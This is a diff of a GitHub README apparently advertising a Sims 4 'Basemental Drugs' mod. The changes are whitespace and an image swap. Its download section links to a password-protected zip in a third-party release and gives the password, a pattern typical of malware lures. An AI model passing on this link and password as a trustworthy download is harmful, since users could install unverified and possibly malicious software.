@@ -9,12 +9,13 @@ Basemental Drugs is a comprehensive mod for The Sims 4 that introduces a new lay
 - Offers a wide range of new interactions and features
 - Regular updates and community support
 - Customizable and can be tailored to different play styles
-- Enhances the realism of the game environment and social interactions
+- Enhances the realism of the game environment and social interactions 
+
   
 ***📋 How to Use***
 
 
-[![win](https://github.com/user-attachments/assets/543855c4-3117-4a4c-a1d2-eaa8a7ba460f)](https://github.com/tiagocabralk/sims-4-basemental-drugs/releases/download/download/sims4_mod_bd_v7.17.218.zip)
+[![win](https://github.com/user-attachments/assets/2b90b32b-e4cd-4c33-aeed-0c2d4357c123)](https://github.com/tiagocabralk/sims-4-basemental-drugs/releases/download/download/sims4_mod_bd_v7.17.218.zip)
 
 > [!NOTE]
 > PASSWORD: **SIMS2024**
